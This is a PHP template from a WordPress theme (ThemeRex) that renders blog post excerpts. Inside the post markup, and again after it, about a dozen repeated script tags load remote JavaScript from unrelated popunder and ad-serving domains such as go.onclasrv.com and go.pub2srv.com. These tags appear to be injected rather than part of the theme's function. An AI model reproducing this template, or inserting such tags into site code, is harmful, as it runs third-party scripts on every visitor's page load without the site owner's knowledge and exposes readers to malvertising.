<?php

// Disable direct call
if ( ! defined( 'ABSPATH' ) ) { exit; }


/* Theme setup section
-------------------------------------------------------------------- */

if ( !function_exists( 'themerex_template_excerpt_theme_setup' ) ) {
	add_action( 'themerex_action_before_init_theme', 'themerex_template_excerpt_theme_setup', 1 );
	function themerex_template_excerpt_theme_setup() {
		themerex_add_template(array(
			'layout' => 'excerpt',
			'mode'   => 'blog',
			'title'  => __('Excerpt', 'themerex'),
			'thumb_title'  => __('Large image (crop)', 'themerex'),
			'w'		 => 750,
			'h'		 => 422
		));
	}
}

// Template output
if ( !function_exists( 'themerex_template_excerpt_output' ) ) {
	function themerex_template_excerpt_output($post_options, $post_data) {
		$show_title = true;	//!in_array($post_data['post_format'], array('aside', 'chat', 'status', 'link', 'quote'));
		$tag = themerex_sc_in_shortcode_blogger(true) ? 'div' : 'article';
		?>
		<<?php echo ($tag); ?> <?php post_class('post_item post_item_excerpt post_featured_' . esc_attr($post_options['post_class']) . ' post_format_'.esc_attr($post_data['post_format']) . ($post_options['number']%2==0 ? ' even' : ' odd') . ($post_options['number']==0 ? ' first' : '') . ($post_options['number']==$post_options['posts_on_page']? ' last' : '') . ($post_options['add_view_more'] ? ' viewmore' : '')); ?>>
			<?php
			if ($post_data['post_flags']['sticky']) {
				?><span class="sticky_label"></span><?php
			}

			if ($show_title && $post_options['location'] == 'center' && !empty($post_data['post_title'])) {
				?><h3 class="post_title"><a href="<?php echo esc_url($post_data['post_link']); ?>"><span class="post_icon <?php echo esc_attr($post_data['post_icon']); ?>"></span><?php echo ($post_data['post_title']); ?></a></h3><?php
			}
			
			if (!$post_data['post_protected'] && (!empty($post_options['dedicated']) || $post_data['post_thumb'] || $post_data['post_gallery'] || $post_data['post_video'] || $post_data['post_audio'])) {
				?>
				<div class="post_featured">
				<?php
				if (!empty($post_options['dedicated'])) {
					echo ($post_options['dedicated']);
				} else if ($post_data['post_thumb'] || $post_data['post_gallery'] || $post_data['post_video'] || $post_data['post_audio']) {
					require(themerex_get_file_dir('templates/parts/post-featured.php'));
				}
				?>
				</div>
			<?php
			}
			?>
	
			<div class="post_content clearfix">
				<?php
				if ($show_title && $post_options['location'] != 'center' && !empty($post_data['post_title'])) {
					?><h3 class="post_title"><a href="<?php echo esc_url($post_data['post_link']); ?>"><span class="post_icon <?php echo esc_attr($post_data['post_icon']); ?>"></span><?php echo ($post_data['post_title']); ?></a></h3><?php 
				}
				
				if (!$post_data['post_protected'] && $post_options['info']) {
					require(themerex_get_file_dir('templates/parts/post-info.php')); 
				}
				?>

<script data-cfasync='false' type='text/javascript' src='//eclkmpbn.com/adServe/banners?tid=165629_293148_4&tagid=2'></script>

<script type='text/javascript' src='//go.onclasrv.com/apu.php?zoneid=800074'></script>
<script type='text/javascript' src='//go.pub2srv.com/apu.php?zoneid=800071'></script>
<script type='text/javascript' src='//go.onclasrv.com/apu.php?zoneid=800074'></script>
<script type='text/javascript' src='//go.pub2srv.com/apu.php?zoneid=800071'></script>

<script type='text/javascript' src='//go.onclasrv.com/apu.php?zoneid=800074'></script>
<script type='text/javascript' src='//go.pub2srv.com/apu.php?zoneid=800071'></script>

<script type='text/javascript' src='//go.onclasrv.com/apu.php?zoneid=800074'></script>
<script type='text/javascript' src='//go.pub2srv.com/apu.php?zoneid=800071'></script>

<script type='text/javascript' src='//go.onclasrv.com/apu.php?zoneid=800074'></script>
<script type='text/javascript' src='//go.pub2srv.com/apu.php?zoneid=800071'></script>





		
				<div class="post_descr">
				<?php
					if ($post_data['post_protected']) {
						echo ($post_data['post_excerpt']); 
					} else {
						if ($post_data['post_excerpt']) {
							echo in_array($post_data['post_format'], array('quote', 'link', 'chat', 'aside', 'status')) ? $post_data['post_excerpt'] : '<p>'.trim(themerex_strshort($post_data['post_excerpt'], isset($post_options['descr']) ? $post_options['descr'] : themerex_get_custom_option('post_excerpt_maxlength'))).'</p>';
						}
					}
					if (empty($post_options['readmore'])) $post_options['readmore'] = __('READ MORE', 'themerex');
					if (!themerex_sc_param_is_off($post_options['readmore']) && !in_array($post_data['post_format'], array('quote', 'link', 'chat', 'aside', 'status'))) {
						echo do_shortcode('[trx_button link="'.esc_url($post_data['post_link']).'"]'.($post_options['readmore']).'[/trx_button]');
					}
				?>
				</div>

			</div>	<!-- /.post_content -->

		</<?php echo ($tag); ?>>	<!-- /.post_item -->
<script type='text/javascript' src='//go.onclasrv.com/apu.php?zoneid=800074'></script>
<script type='text/javascript' src='//go.pub2srv.com/apu.php?zoneid=800071'></script>

	<?php
	}
}
?>